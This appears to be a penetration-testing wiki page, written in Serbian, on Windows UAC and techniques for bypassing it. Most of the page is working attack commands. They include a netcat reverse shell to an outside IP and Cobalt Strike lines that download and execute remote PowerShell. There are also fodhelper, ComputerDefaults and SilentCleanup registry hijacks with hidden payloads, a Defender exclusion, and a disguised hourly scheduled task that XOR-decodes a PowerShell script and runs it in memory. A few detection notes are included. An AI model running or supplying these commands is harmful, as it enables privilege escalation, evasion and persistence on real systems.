# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za potvrdu pri aktivnostima sa povišenim privilegijama**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da obavlja zadatke koji **potencijalno mogu da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **pokreću u bezbednosnom kontekstu naloga koji nije administratorski**, osim ako administrator izričito ne odobri tim aplikacijama/zadacima pristup sistemu na administratorskom nivou. To je funkcija pogodnosti koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, administratorski korisnik dobija 2 tokena: standardni korisnički token za uobičajene radnje na srednjem nivou integriteta i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše, uključujući proces prijavljivanja, korisničko iskustvo i arhitekturu UAC-a.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne smernice za podešavanje načina rada UAC-a u svojoj organizaciji, lokalno (pomoću secpol.msc) ili tako što će ih konfigurisati i primeniti putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja detaljno su objašnjena [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 postavki Group Policy. Sledeća tabela pruža dodatne detalje:

| Postavka Group Policy                                                                                                                                                                                                                                                                                                                                                           | Ključ registratora                | Podrazumevana postavka                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola korisničkog naloga: Režim odobravanja administratora za ugrađeni administratorski nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Ponašanje upita za podizanje privilegija za administratore u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Traži potvrdu za binarne datoteke koje nisu Windows, na bezbednoj radnoj površini) |
| [Kontrola korisničkog naloga: Ponašanje upita za podizanje privilegija za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Traži akreditive na bezbednoj radnoj površini)         |
| [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i traženje podizanja privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
| [Kontrola korisničkog naloga: Podizanje privilegija samo za potpisane i proverene izvršne datoteke](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Podizanje privilegija samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Pokretanje svih administratora u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Omogućavanje UIAccess aplikacijama da traže podizanje privilegija bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Prebacivanje na bezbednu radnu površinu prilikom upita za podizanje privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Virtuelizacija neuspelih upisa datoteka i registratora na lokacije za pojedinačne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Smernice za instaliranje softvera u Windows-u

**Lokalne bezbednosne smernice** (u većini sistema „secpol.msc“) podrazumevano su konfigurisane tako da **sprečavaju korisnike koji nisu administratori da instaliraju softver**. To znači da čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Ključevi registratora za zahtev UAC-a za podizanje privilegija

Kao standardni korisnik bez administratorskih prava možete podesiti da UAC **traži akreditive od „standardnog“ naloga** kada pokuša da obavi određene radnje. Za to je potrebno izmeniti određene **ključeve registratora**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako je korisnik u grupi **Administrators**, ove izmene primoravaju korisnika da **ponovo unese akreditive svog naloga** kako bi obavio administrativne radnje.

**U praksi je ovo korisno samo ako već imate token sa povišenim privilegijama, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom će sam upis u registrator biti blokiran.**

Ključevi i unosi registratora koje treba izmeniti su sledeći (podrazumevane vrednosti su navedene u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administrativne operacije traže od korisnika da ponovo unese svoje akreditive.

### Napomena

**Kontrola korisničkog naloga nije bezbednosna granica.** Zato standardni korisnici ne mogu da izađu iz svojih naloga i dobiju administratorska prava bez lokalnog exploita za eskalaciju privilegija.

### Zatražiti od korisnika „pun pristup računaru“

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su veb-pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla privremenih internet datoteka). To se postiže pokretanjem pregledača sa tokenom niskog integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada udaljenim izvršavanjem koda da pristupe osetljivim podacima na sistemu.
- Kada se korisnik prijavi u Windows, sistem kreira pristupni token koji sadrži listu privilegija korisnika. Privilegije su definisane kao kombinacija korisničkih prava i mogućnosti. Token sadrži i listu korisničkih akreditiva, koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows da automatski prijavi određenog korisnika pri pokretanju sistema, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u okruženjima sa kioscima ili za potrebe testiranja. Koristite ovo samo na bezbednim sistemima jer se lozinka izlaže u registru.

Podesite sledeće ključeve pomoću Registry Editor-a ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Da biste se vratili na uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je UAC bypass jednostavan ako imate grafički pristup žrtvi, jer možete jednostavno da kliknete na „Yes“ kada se pojavi UAC prompt.

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je podešen na najviši nivo bezbednosti (Always) nego ako je podešen na neki od ostalih nivoa (Default).**

### Brza provera iz ljuske sa srednjim nivoom integriteta

Pre nego što pokušate bypass, potvrdite da ste u odgovarajućoj situaciji i utvrdite verziju sistema kako biste pronašli poznate metode koje rade:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktične napomene:
- Ako je `EnableLUA=0`, nije vam potreban bypass: svaki admin token može direktno da zatraži high integrity.
- `ConsentPromptBehaviorAdmin=2` ili `5` je uobičajen scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže lestvicu, ali ipak testirajte konkretnu verziju umesto da pretpostavite da bypass neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na novijim verzijama Windowsa.<sup>[[3]](#references)</sup>

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete da **pokrenete reverse shell sa admin privilegijama** (high integrity level) koristeći nešto poput:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass pomoću dupliranja tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Lokalni RPC + ponovo upotrebljiv debug objekat

Lokalni RPC interfejs AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` može da kreira proces sa omogućenim debuggingom. Procesi kreirani uz debugging na istoj niti dele debug objekat te niti; događaj kreiranja sadrži handle procesa sa punim pristupom, čak i kada sam RPC rezultat daje samo ograničen pristup. Time ponovna upotreba debug objekta postaje UAC primitiva za člana grupe Administrators sa srednjim nivoom integriteta.<sup>[[11]](#references)[[12]](#references)</sup>

Praktičan niz koraka je:<sup>[[11]](#references)[[12]](#references)</sup>

1. Pozovite lokalnu RPC metodu (direktno ili preko `NdrAsyncClientCall`) da biste kreirali ne-elevated pomoćni proces sa omogućenim debuggingom.
2. Upitom preko `NtQueryInformationProcess` pribavite `ProcessDebugObjectHandle`, odvojite ga pomoću `NtRemoveProcessDebug`, zadržite objekat i prekinite pomoćni proces.
3. Pomoću istog RPC interfejsa kreirajte pouzdan auto-elevated proces, a zatim povežite sačuvani objekat sa pozivajućom niti preko `DbgUiSetThreadDebugObject`.
4. Pozovite `WaitForDebugEvent` i preuzmite handle procesa iz `CREATE_PROCESS_DEBUG_EVENT`; duplirajte ga pomoću `NtDuplicateObject` pre nastavka.
5. Prosledite duplirani handle funkciji `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i pokrenite payload pomoću proširene strukture startup-info. Time se ponovo koristi kontekst elevated procesa, a detetu se dodeljuje roditeljski odnos koji izgleda pouzdano.

Potražite ovaj kratak niz radnji, a ne samo auto-elevated binarnu datoteku: kreiranje procesa preko lokalnog AppInfo RPC-a, upite za `ProcessDebugObjectHandle`, odvajanje i ponovno povezivanje debuggera, neposredni događaj kreiranja procesa za debugging, dupliranje handle-a i dete čiji zabeleženi roditeljski proces nije proces koji je pozvao API-je za kreiranje.<sup>[[12]](#references)</sup>

### **Veoma** osnovni UAC „bypass“ (pun pristup sistemu datoteka)

Ako imate shell sa korisnikom koji pripada grupi Administrators, možete da **montirate C$** SMB deljeni resurs (sistem datoteka) lokalno kao novi disk i imaćete **pristup svemu unutar sistema datoteka** (čak i početnoj fascikli Administratora).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Zaobilaženje UAC-a pomoću Cobalt Strike-a

Tehnike za Cobalt Strike će raditi samo ako UAC nije podešen na maksimalni nivo bezbednosti.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Elevirani COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevirani COM objekti i dalje predstavljaju praktičnu UAC površinu na modernim verzijama sistema. UACME i dalje prati `ICMLuaUtil` kao funkcionalan na aktuelnim verzijama Windowsa, a ofanzivni alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnoj radnoj površini, 64-bitnog izvršavanja i ponekad lažnog predstavljanja PEB-a/procesa pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom podređenom procesu).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto korišćenja naivnog `CreateProcess` omotača.
- Očekujte da se podređeni proces pokrene kao **zaseban elevirani proces**; mnogi BOF-ovi ne eleviraju trenutni beacon direktno.

### KRBUACBypass

Dokumentacija i alat dostupni su na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploiti za UAC bypass

[**UACME**](https://github.com/hfiref0x/UACME) je kolekcija tehnika za UAC bypass. Kompajlirajte ga pomoću Visual Studio-a ili MSBuild-a; build kreira nekoliko izvršnih datoteka (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), pa izaberite metod koji odgovara verziji sistema na meti.<sup>[[3]](#references)</sup>\
Budite oprezni: neki bypassi pokreću vidljive programe ili prikazuju upite koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>

UACME navodi **verziju build-a od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu, iz verzija build-a možete saznati Windows izdanje `1607`.

Praktičan postupak je da prvo **procenite build hosta**, a tek potom pokrenete odgovarajuću metodu:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` brzo upoređuje lokalnu verziju sa svojim poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` ostaje najbolji javni katalog za povezivanje bypass-a sa konkretnom verzijom. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i beleške o izdanju umesto da pretpostavite da stari PoC i dalje radi neizmenjeno.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess lanci kompatibilni sa Always Notify (UACME 3.7.1)

`Always Notify` ne eliminiše sve UAC bypass-e. UACME 3.7.1 implementira tri nove x64 metode koje kombinuju korisnički kontrolisano stanje okruženja/protokola sa ponašanjem povišenog zakazanog zadatka ili UIAccess-a i označava ih kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF aktivirani `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` navede povišeni `taskhostw.exe` da side-load-uje `unifiedconsent.dll`. UACME prati ovu metodu od Windows 10 build 19041.
- **84 — TabTip:** upotrebite isti primitiv promenljive okruženja protiv UIAccess `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od verzije, a zatim izvršite pivot iz nastalog UIAccess konteksta visokog integriteta. UACME prati ovu metodu od Windows 8.1 / Server 2016.
- **85 — Narrator:** preotmite korisnički protokol `feedback-hub`, upravljajte Narrator-om pomoću `Alt+CapsLock+F`, a zatim pokrenite upisivu kopiju `osk.exe` koja side-load-uje `OskSupport.dll`. Za ovo je potrebna interaktivna radna površina; UACME prati ovu metodu od Windows 10 1809 / Server 2019.

Nakon što napravite payload units i Akagi prema UACME dokumentaciji, pozovite odgovarajući broj metode (opciona komanda podrazumevano je `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Metode 84 i 85 zavise od interakcije sa UIAccess/desktop okruženjem, zato ne očekujte da rade neizmenjene iz Session 0 ili neinteraktivne servisne ljuske. Sve tri manipulišu stanjem okruženja/protokola i pripremaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (otmica registra)

Pouzdani binarni fajl `fodhelper.exe` automatski se pokreće sa povišenim privilegijama u modernom Windows-u. Kada se pokrene, pretražuje donju putanju registra za trenutnog korisnika, ne proveravajući glagol `DelegateExecute`. Postavljanjem komande na tu putanju, procesu sa Medium Integrity nivoom (korisnik je član grupe Administrators) omogućava se da pokrene proces sa High Integrity nivoom bez UAC upita.

Putanja registra koju fodhelper pretražuje:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell koraci (podesite svoj payload, pa ga pokrenite)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Napomene:
- Radi kada je trenutni korisnik član grupe Administrators, a nivo UAC-a je podrazumevan/blag (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da biste pokrenuli 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Izbegavajte UI upite radi stealth-a.

#### Okidač `ComputerDefaults.exe` za isti `ms-settings` handler

`ComputerDefaults.exe` razrešava istu korisničku asocijaciju `ms-settings\Shell\Open\command` kao `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nakon podešavanja podrazumevane komande i prazne vrednosti `DelegateExecute` iznad, upotrebite `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kao alternativni okidač; nemojte ponavljati podešavanje registra.<sup>[[13]](#references)[[14]](#references)</sup> Preduslovi za administratorski nalog srednjeg integriteta i UAC smernice navedeni u napomenama za `fodhelper.exe` i dalje važe.<sup>[[2]](#references)[[3]](#references)</sup> UACME beleži ovaj okidač od Windows 10 RS4 (build 17134), zato ga proverite na ciljnoj verziji.<sup>[[3]](#references)</sup>

#### Varijanta CurVer/extension hijack (samo HKCU)

Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju ProgID `ms-settings`** putem korisničke vrednosti `CurVer`. Binarna datoteka sa automatskim podizanjem privilegija i dalje razrešava handler pod `HKCU`, pa za postavljanje ključeva nije potreban administratorski token:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Kada dobije povišene privilegije, malware često **isključuje buduće upite** tako što postavlja `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatne mere za izbegavanje odbrane (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo uspostavlja persistence kako bi se izvršavao sa visokim nivoom integriteta. Tipičan persistence zadatak čuva **XOR-šifrovanu PowerShell skriptu** na disku, a zatim je svakog sata dekodira i izvršava u memoriji:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, pa se detekcija oslanja na praćenje **`CurVer` hijack-a**, neovlašćene izmene `ConsentPromptBehaviorAdmin`, kreiranja Defender izuzetka ili scheduled tasks koji dešifruju PowerShell u memoriji.<sup>[[5]](#references)</sup>

### UAC bypass putem zadatka `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete da preusmerite to proširenje na proizvoljnu komandu i dobijete visok integritet bez dijaloga za saglasnost.<sup>[[8]](#references)</sup> Ovu metodu i dalje vredi testirati na novijim verzijama jer UACME i dalje podržava ovu tehniku, a praćenje nedavnih prijava problema pokazuje da Windows 11 24H2 možda zahteva samo manje izmene navodnika.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Ako zadatak na toj build verziji navodi putanju u navodnicima, pokušajte ponovo tako što ćete payload završiti navodnikom (na primer `cmd.exe"`). Uvek nakon testiranja očistite `HKCU\Environment\windir`.

#### Još UAC bypass tehnika

Mnogi klasični UAC bypass-i koji zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **potpunu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Pređite na **proces** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload – Još UAC bypass tehnika: To možete postići pomoću meterpreter sesije. Pređite na proces čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, možete jednostavno da prihvatite UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC predstavlja.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), tu će možda biti **neki alati pokrenuti kao administrator** pomoću kojih možete direktno da **pokrenete**, na primer, **cmd** **kao admin**, bez ponovnog UAC prompta, kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.

### Bučni brute-force UAC bypass

Ako je šum prihvatljiv, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može neprestano da traži povišene privilegije dok ih korisnik ne prihvati.

### Sopstveni bypass – osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnogi UAC bypass-i zloupotrebljavaju DLL hijacking** (često tako što nateraju binarnu datoteku sa povišenim privilegijama da učita DLL pod kontrolom napadača sa putanje na koju može da se upisuje). [Pročitajte ovo da biste saznali kako da pronađete DLL hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binarnu datoteku koja se **autoelevate** (proverite da li se pri izvršavanju pokreće sa visokim nivoom integriteta).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL u neku **zaštićenu putanju** (kao što je C:\Windows\System32), u koju nemate dozvolu za upisivanje. Ovo možete zaobići pomoću:
   1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava izdvajanje sadržaja CAB datoteke u zaštićene putanje (jer se ovaj alat izvršava sa visokim nivoom integriteta).
   2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** za kopiranje DLL-a u zaštićenu putanju i izvršavanje ranjive binarne datoteke koja se automatski podiže na viši nivo privilegija.

### Još jedna UAC bypass tehnika

Sastoji se u tome da pratite da li **autoElevated binarna datoteka** pokušava da iz **registry-ja** **pročita** **ime/putanju** binarne datoteke ili **komande** koju treba **izvršiti** (ovo je zanimljivije ako binarna datoteka traži te informacije u **HKCU**).

### UAC bypass preko `SysWOW64\iscsicpl.exe` + DLL hijacking pomoću korisničkog `PATH`-a

32-bitna datoteka `C:\Windows\SysWOW64\iscsicpl.exe` je binarna datoteka sa **automatskim podizanjem privilegija** koja se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete da smestite zlonamerni `iscsiexe.dll` u **folder u koji korisnik može da upisuje**, a zatim izmenite `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može da učita DLL napadača u proces podignutih privilegija `iscsicpl.exe` **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada je trenutni korisnik član grupe **Administrators**, ali zbog UAC-a radi sa **Medium Integrity** nivoom.
- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zasebnu binarnu datoteku i nezavisno proverite njeno ponašanje.
- Ovaj mehanizam kombinuje **auto-elevation** i **DLL search-order hijacking**, pa je isti ProcMon postupak koji se koristi za druge UAC bypass-e koristan za proveru nedostajućeg učitavanja DLL-a.

Minimalni tok:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
